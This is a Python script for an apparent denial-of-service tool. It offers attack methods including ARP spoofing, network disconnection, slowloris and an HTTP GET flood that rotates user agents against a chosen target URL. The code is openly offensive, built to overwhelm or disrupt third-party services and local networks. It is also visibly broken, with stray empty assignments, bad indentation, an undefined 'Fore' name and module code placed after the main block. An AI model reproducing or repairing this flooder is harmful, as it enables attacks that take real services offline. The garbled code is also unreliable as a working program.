# -*- coding: utf-8 -*-
import os
import sys
import time
import fade
import requests
import sys
import threading
import random
import re
import argparse
import json
import random
import fade
import requests
from colorama import Fore as F
from requests.exceptions import Timeout

os.chdir(os.path.dirname(os.path.realpath(__file__)))
os.system("cls" if os.name == "nt" else "clear")

os.system("clear")
logo = """
 __     __ __    __ _______   ____
|  |   |  |  |  |  |   __  \
|  |___|  |  |  |  |  |  |  |
|   ___   |  |  |  |  |  |  |  
|  |   |  |  |__|  |  |__/  | 
|__|   |__|\____|__|_______/
"""
faded_text = fade.fire(logo)
print(faded_text)
try:
    from tools.addons.checks import (check_http_target_input,
                                     check_local_target_input,
                                     check_method_input, check_number_input)
    from tools.addons.ip_tools import show_local_host_ips
    from tools.addons.logo import show_logo
    from tools.method import AttackMethod
except (ImportError, NameError) as err:
    print("\nFailed to import something", err)


def main() -> None:
    """Run main application."""
    show_logo()
    try:
            if (method := check_method_input()) in ["arp-spoof", "disconnect"]:()
        target = ()
            check_http_target_input()
            if method not in ["arp-spoof", "disconnect"]
            else check_local_target_input()
        
        threads = ()
            check_number_input("threads")
            if method not in ["arp-spoof", "disconnect"]
            else 1
        
        time = check_number_input("time")
        sleep_time = check_number_input("sleep time") if "slowloris" in method else 0

        with AttackMethod(
            duration=time,
            method_name=method,
            threads=threads,
            target=target,
            sleep_time=sleep_time,
        ) as attack:
            attack.start()
    except KeyboardInterrupt:
        print(
            f"\n\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.\n\n{Fore.RESET}"
        )
        sys.exit(1)


if __name__ == "__main__":
    main(
    )
with open("tools/L7/user_agents.json", "r") as agents:
    user_agents = json.load(agents)["agents"]


headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
}

color_code = {True: F.GREEN, False: F.RED}


def flood(target: str) -> None:
    """Start an HTTP GET request flood.

    Args:
        - target - Target's URL

    Returns:
        None
    """
    global headers

    headers["User-agent"] = random.choice(user_agents)

    try:
        response = requests.get(target, headers=headers, timeout=4)
    except (Timeout, OSError):
        return
    else:
        status = (
            f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
        )
        payload_size = f"{F.RESET} Requested Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
        print(f"{status}{F.RESET} --> {payload_size} {F.RESET}")
